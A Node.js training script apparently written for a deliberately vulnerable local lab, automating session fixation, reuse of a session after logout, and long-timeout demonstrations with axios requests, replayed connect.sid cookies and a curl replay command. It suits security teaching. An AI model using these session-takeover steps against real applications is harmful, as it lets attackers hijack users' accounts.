/**
 * Session Management Vulnerability Test Script
 * 
 * This script demonstrates automated attacks against the vulnerable session management lab.
 * It shows how these attacks could be performed programmatically by attackers.
 */

// Import required libraries
const axios = require('axios');
const readline = require('readline');

// Configure axios
const api = axios.create({
  baseURL: 'http://localhost:3001',
  withCredentials: true
});

// Create readline interface for user input
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Helper function to prompt for input
const prompt = (question) => new Promise((resolve) => rl.question(question, resolve));

/**
 * Session Fixation Attack Demo
 */
async function demonstrateSessionFixation() {
  console.log('\n=== SESSION FIXATION ATTACK DEMONSTRATION ===\n');
  
  // First, set the vulnerability mode to fixation
  await api.post('/api/set-vulnerability', { vulnerability: 'fixation' });
  console.log('✓ Vulnerability mode set to: Session Fixation');
  
  // Generate a custom session ID (this would be the attacker's session)
  const attackerSessionId = `attacker-session-${Date.now()}`;
  console.log(`✓ Attacker generated session ID: ${attackerSessionId}`);
  
  // Login as victim with the attacker's session ID
  console.log('\nSimulating victim login using attacker\'s session ID...');
  
  try {
    const loginResponse = await api.post(`/api/login?sessionId=${attackerSessionId}`, {
      username: 'victim',
      password: 'victim123'
    });
    
    if (loginResponse.data.success) {
      console.log('✓ Victim successfully logged in with attacker\'s session ID');
      
      // Now the attacker can use the same session ID to access the victim's account
      console.log('\nAttacker is now attempting to access victim\'s session...');
      
      // Create a new axios instance with the attacker's session cookie
      const attackerApi = axios.create({
        baseURL: 'http://localhost:3001',
        withCredentials: true,
        headers: {
          Cookie: `connect.sid=${attackerSessionId}`
        }
      });
      
      // Attacker tries to access protected data
      const protectedResponse = await attackerApi.get('/api/protected');
      
      if (protectedResponse.data.success) {
        console.log('✓ SESSION FIXATION ATTACK SUCCESSFUL!');
        console.log('✓ Attacker accessed victim\'s protected data:');
        console.log(JSON.stringify(protectedResponse.data, null, 2));
      }
    }
  } catch (error) {
    console.error('Error during session fixation test:', error.message);
  }
}

/**
 * Session Hijacking Attack Demo (after logout)
 */
async function demonstrateSessionHijacking() {
  console.log('\n=== SESSION HIJACKING ATTACK DEMONSTRATION ===\n');
  
  // First, set the vulnerability mode to hijacking
  await api.post('/api/set-vulnerability', { vulnerability: 'hijacking' });
  console.log('✓ Vulnerability mode set to: Session Hijacking');
  
  // Login to get a valid session
  console.log('\nLogging in as victim to obtain a session...');
  const loginResponse = await api.post('/api/login', {
    username: 'victim',
    password: 'victim123'
  });
  
  if (loginResponse.data.success) {
    console.log('✓ Logged in successfully');
    const victimSessionId = loginResponse.data.sessionId;
    console.log(`✓ Captured session ID: ${victimSessionId}`);
    
    // Logout the victim
    console.log('\nVictim is logging out...');
    await api.post('/api/logout');
    console.log('✓ Victim logged out');
    
    // Now attempt to use the session ID even after logout
    console.log('\nAttacker is attempting to use the session after logout...');
    
    // Create a new axios instance with the captured session cookie
    const attackerApi = axios.create({
      baseURL: 'http://localhost:3001',
      withCredentials: true,
      headers: {
        Cookie: `connect.sid=${victimSessionId}`
      }
    });
    
    try {
      // Attacker tries to access protected data
      const protectedResponse = await attackerApi.get('/api/protected');
      
      if (protectedResponse.data.success) {
        console.log('✓ SESSION HIJACKING ATTACK SUCCESSFUL!');
        console.log('✓ Attacker accessed protected data after victim logout:');
        console.log(JSON.stringify(protectedResponse.data, null, 2));
      }
    } catch (error) {
      console.log('✗ Session hijacking failed - session properly invalidated');
    }
  }
}

/**
 * Session Timeout Demonstration
 */
async function demonstrateSessionTimeout() {
  console.log('\n=== SESSION TIMEOUT VULNERABILITY DEMONSTRATION ===\n');
  
  // First, set the vulnerability mode to timeout
  await api.post('/api/set-vulnerability', { vulnerability: 'timeout' });
  console.log('✓ Vulnerability mode set to: Long Session Timeout (30 days)');
  
  // Login to get a valid session
  console.log('\nLogging in to obtain a session...');
  const loginResponse = await api.post('/api/login', {
    username: 'victim',
    password: 'victim123'
  });
  
  if (loginResponse.data.success) {
    console.log('✓ Logged in successfully');
    const sessionId = loginResponse.data.sessionId;
    console.log(`✓ Session ID: ${sessionId}`);
    
    console.log('\nThis session will remain valid for 30 days, even if unused.');
    console.log('An attacker who obtains this session ID can use it anytime within that period.');
    console.log('To demonstrate: copy this session ID and try accessing the protected route later.');
    console.log(`curl -X GET http://localhost:3001/api/protected --cookie "connect.sid=${sessionId}"`);
  }
}

/**
 * Main function to run the demonstrations
 */
async function main() {
  console.log('===== SESSION MANAGEMENT VULNERABILITY TEST SCRIPT =====\n');
  console.log('This script demonstrates automated attacks against session management vulnerabilities.\n');
  
  while (true) {
    console.log('\nSelect a vulnerability to demonstrate:');
    console.log('1. Session Fixation Attack');
    console.log('2. Session Hijacking After Logout');
    console.log('3. Long Session Timeout');
    console.log('0. Exit');
    
    const choice = await prompt('\nEnter your choice (0-3): ');
    
    switch (choice) {
      case '1':
        await demonstrateSessionFixation();
        break;
      case '2':
        await demonstrateSessionHijacking();
        break;
      case '3':
        await demonstrateSessionTimeout();
        break;
      case '0':
        console.log('\nExiting...');
        rl.close();
        return;
      default:
        console.log('Invalid choice, please try again.');
    }
    
    await prompt('\nPress Enter to continue...');
  }
}

// Start the demonstration
main().catch(console.error);